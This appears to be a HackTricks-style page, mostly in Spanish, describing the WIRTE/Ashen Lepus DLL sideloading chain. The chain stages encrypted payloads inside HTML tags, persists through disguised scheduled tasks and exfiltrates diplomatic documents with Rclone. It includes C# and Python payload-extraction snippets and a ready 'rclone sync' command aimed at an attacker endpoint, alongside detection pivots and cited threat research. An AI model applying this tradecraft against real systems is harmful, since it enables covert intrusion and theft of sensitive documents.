# Avanzado DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Tradecraft Overview

Ashen Lepus (aka WIRTE) weaponized a repeatable pattern that chains DLL sideloading, staged HTML payloads, and modular .NET backdoors to persist inside Middle Eastern diplomatic networks. The technique is reusable by any operator because it relies on:

- **Archive-based social engineering**: PDFs benignos instruyen a las víctimas a descargar un archivo RAR desde un sitio de intercambio de archivos. El archivo agrupa un EXE visor de documentos con apariencia legítima, una DLL maliciosa nombrada como una librería confiable (p. ej., `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`) y un `Document.pdf` señuelo.
- **DLL search order abuse**: la víctima hace doble clic en el EXE, Windows resuelve la importación de la DLL desde el directorio actual, y el loader malicioso (AshenLoader) se ejecuta dentro del proceso confiable mientras el PDF señuelo se abre para evitar sospechas.
- **Living-off-the-land staging**: cada etapa posterior (AshenStager → AshenOrchestrator → módulos) se mantiene fuera del disco hasta que es necesaria, entregada como blobs encriptados escondidos dentro de respuestas HTML aparentemente inocuas.

## Multi-Stage Side-Loading Chain

1. **Decoy EXE → AshenLoader**: el EXE side-loads AshenLoader, que realiza reconocimiento del host, lo cifra con AES-CTR y lo POSTea dentro de parámetros rotativos como `token=`, `id=`, `q=` o `auth=` a rutas con aspecto de API (p. ej., `/api/v2/account`).
2. **HTML extraction**: el C2 solo revela la siguiente etapa cuando la IP cliente se geolocaliza en la región objetivo y el `User-Agent` coincide con el implant, frustrando sandboxes. Cuando las comprobaciones pasan, el cuerpo HTTP contiene un blob `<headerp>...</headerp>` con el payload AshenStager en Base64/AES-CTR.
3. **Second sideload**: AshenStager se despliega con otro binario legítimo que importa `wtsapi32.dll`. La copia maliciosa inyectada en el binario solicita más HTML, esta vez esculpiendo `<article>...</article>` para recuperar AshenOrchestrator.
4. **AshenOrchestrator**: un controlador modular .NET que decodifica una config JSON en Base64. Los campos `tg` y `au` de la config se concatenan/hashean para formar la clave AES, que descifra `xrk`. Los bytes resultantes actúan como clave XOR para cada blob de módulo obtenido posteriormente.
5. **Module delivery**: cada módulo se describe mediante comentarios HTML que redirigen al parser a una etiqueta arbitraria, rompiendo reglas estáticas que solo buscan `<headerp>` o `<article>`. Los módulos incluyen persistencia (`PR*`), uninstallers (`UN*`), reconocimiento (`SN`), captura de pantalla (`SCT`) y exploración de archivos (`FE`).

### HTML Container Parsing Pattern
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Incluso si los defensores bloquean o eliminan un elemento específico, el operador solo necesita cambiar la etiqueta indicada en el comentario HTML para reanudar la entrega.

### Ayudante rápido de extracción (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## Paralelos de evasión de HTML Staging

La investigación reciente sobre HTML smuggling (Talos) destaca payloads ocultos como cadenas Base64 dentro de bloques `<script>` en attachments HTML y decodificados vía JavaScript en tiempo de ejecución. El mismo truco puede reutilizarse para respuestas C2: poner blobs cifrados en stage dentro de una etiqueta script (u otro elemento del DOM) y decodificarlos en memoria antes de AES/XOR, haciendo que la página parezca HTML ordinario. Talos también muestra ofuscación por capas (renombrado de identificadores más Base64/Caesar/AES) dentro de etiquetas `<script>`, lo que se mapea limpiamente a blobs C2 staged en HTML.

## Notas sobre variantes recientes (2024-2025)

- Check Point observó campañas WIRTE en 2024 que seguían dependiendo de sideloading basado en archivos pero usaban `propsys.dll` (stagerx64) como la primera etapa. El stager decodifica el siguiente payload con Base64 + XOR (key `53`), envía peticiones HTTP con un `User-Agent` hardcodeado, y extrae blobs cifrados embebidos entre etiquetas HTML. En una rama, la etapa se reconstruyó a partir de una larga lista de cadenas IP embebidas decodificadas vía `RtlIpv4StringToAddressA`, luego concatenadas en los bytes del payload.
- OWN-CERT documentó tooling WIRTE anterior donde el dropper side-loaded `wtsapi32.dll` protegía cadenas con Base64 + TEA y usaba el nombre del DLL como clave de desencriptado, luego XOR/Base64-ofuscaba datos de identificación del host antes de enviarlos al C2.

## Crypto & C2 Hardening

- **AES-CTR everywhere**: los loaders actuales embeben claves de 256 bits más nonces (p. ej., `{9a 20 51 98 ...}`) y opcionalmente añaden una capa XOR usando strings como `msasn1.dll` antes/después del desencriptado.
- **Key material variations**: loaders previos usaban Base64 + TEA para proteger cadenas embebidas, con la clave de desencriptado derivada del nombre del DLL malicioso (p. ej., `wtsapi32.dll`).
- **Infrastructure split + subdomain camouflage**: los servidores de staging se separan por herramienta, alojados en distintos ASNs, y a veces frontados por subdominios con apariencia legítima, de modo que quemar una etapa no expone el resto.
- **Recon smuggling**: los datos enumerados ahora incluyen listados de Program Files para detectar apps de alto valor y siempre se cifran antes de abandonar el host.
- **URI churn**: parámetros de query y rutas REST rotan entre campañas (`/api/v1/account?token=` → `/api/v2/account?auth=`), invalidando detecciones frágiles.
- **User-Agent pinning + safe redirects**: la infraestructura C2 responde solo a cadenas UA exactas y, de lo contrario, redirige a sitios benignos de noticias/salud para mimetizarse.
- **Gated delivery**: los servidores están geo-vallados y solo responden a implants reales. Clientes no aprobados reciben HTML no sospechoso.

## Persistencia y bucle de ejecución

AshenStager deja scheduled tasks que se hacen pasar por tareas de mantenimiento de Windows y ejecutan vía `svchost.exe`, p. ej.:

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Estas tareas relanzan la cadena de sideloading al arrancar o en intervalos, asegurando que AshenOrchestrator pueda solicitar módulos frescos sin tocar disco de nuevo.

## Uso de clientes de sincronización benignos para exfiltración

Los operadores staging documentos diplomáticos dentro de `C:\Users\Public` (lectura mundial y no sospechoso) mediante un módulo dedicado, luego descargan el binario legítimo de [Rclone](https://rclone.org/) para sincronizar ese directorio con el almacenamiento del atacante. Unit42 señala que es la primera vez que este actor es observado usando Rclone para exfiltración, alineándose con la tendencia más amplia de abusar de tooling legítimo de sincronización para mezclarse con tráfico normal:

1. Stage: copy/collect target files into `C:\Users\Public\{campaign}\`.
2. Configure: ship an Rclone config pointing at an attacker-controlled HTTPS endpoint (e.g., `api.technology-system[.]com`).
3. Sync: run `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` so the traffic resembles normal cloud backups.

Porque Rclone se usa ampliamente en flujos de trabajo legítimos de backup, los defensores deben centrarse en ejecuciones anómalas (nuevos binarios, remotes extraños, o sincronizaciones súbitas de `C:\Users\Public`).

## Pivotes de detección

- Alertar sobre procesos firmados que inesperadamente cargan DLLs desde rutas escribibles por el usuario (filtros Procmon + `Get-ProcessMitigation -Module`), especialmente cuando los nombres de DLL coinciden con `netutils`, `srvcli`, `dwampi`, o `wtsapi32`.
- Inspeccionar respuestas HTTPS sospechosas por **grandes blobs Base64 embebidos dentro de etiquetas inusuales** o protegidos por comentarios `<!-- TAG: <xyz> -->`.
- Extender la búsqueda en HTML a **cadenas Base64 dentro de bloques `<script>`** (estilo HTML smuggling staging) que son decodificadas vía JavaScript antes del procesamiento AES/XOR.
- Cazar **scheduled tasks** que ejecuten `svchost.exe` con argumentos no característicos de servicios o que apunten a directorios de droppers.
- Rastrear **C2 redirects** que solo devuelven payloads para cadenas `User-Agent` exactas y de otro modo rebotan a dominios legítimos de noticias/salud.
- Monitorizar por binarios **Rclone** apareciendo fuera de ubicaciones gestionadas por TI, nuevos archivos `rclone.conf`, o trabajos de sincronización que extraen desde directorios de staging como `C:\Users\Public`.

## References

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [Hamas-affiliated Threat Actor WIRTE Continues its Middle East Operations and Moves to Disruptive Activity](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [WIRTE: In Search of Lost Time](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)

{{#include ../../../banners/hacktricks-training.md}}
